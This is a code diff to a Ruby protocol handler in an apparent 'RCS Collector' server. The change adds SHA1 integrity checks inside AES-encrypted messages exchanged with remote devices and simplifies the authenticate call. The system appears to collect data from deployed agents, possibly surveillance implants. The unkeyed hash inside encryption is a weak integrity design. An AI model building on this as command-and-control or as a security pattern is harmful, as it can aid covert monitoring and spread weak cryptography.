@@ -14,6 +14,7 @@ require 'rcs-common/pascalize'
 
 # system
 require 'securerandom'
+require 'digest/sha1'
 
 module RCS
 module Collector
@@ -26,7 +27,7 @@ class Protocol
   # Authentication phase
   # ->  Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, SubType, sha1 ( BuildId, InstanceId, SubType, Cb ) )
   # <-  [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]  |  SetCookie ( SessionCookie )
-  def self.authenticate(peer, uri, cookie, content)
+  def self.authenticate(peer, uri, content)
     trace :info, "[#{peer}] Authentication required..."
 
     # decrypt the message with the per customer signature
@@ -157,11 +158,14 @@ class Protocol
       return
     end
 
-    # decrypt the message
     begin
+      # decrypt the message
       message = aes_decrypt(content, session[:key])
-    rescue
-      trace :error, "[#{peer}][#{cookie}] Invalid message decryption"
+      # check the integrity at the end of the message
+      check = message.slice!(message.length - Digest::SHA1.new.digest_length, message.length)
+      raise "Invalid sha1 check" unless check == Digest::SHA1.digest(message)
+    rescue Exception => e
+      trace :error, "[#{peer}][#{cookie}] Invalid message decryption: #{e.message}"
       return
     end
 
@@ -179,8 +183,10 @@ class Protocol
       return
     end
     
-    # crypt the message with the session key
     begin
+      # add the integrity at the end of the response
+      response += Digest::SHA1.digest(response)
+      # crypt the message with the session key
       response = aes_encrypt(response, session[:key])
     rescue
       trace :error, "[#{peer}][#{cookie}] Invalid message encryption"
@@ -198,7 +204,7 @@ class Protocol
 
     # if the request does not contains any cookies,
     # we need to perform authentication first
-    return authenticate(peer, uri, cookie, content) if cookie.nil?
+    return authenticate(peer, uri, content) if cookie.nil?
 
     # we have a cookie, check if it's valid
     return unless valid_authentication(peer, cookie)
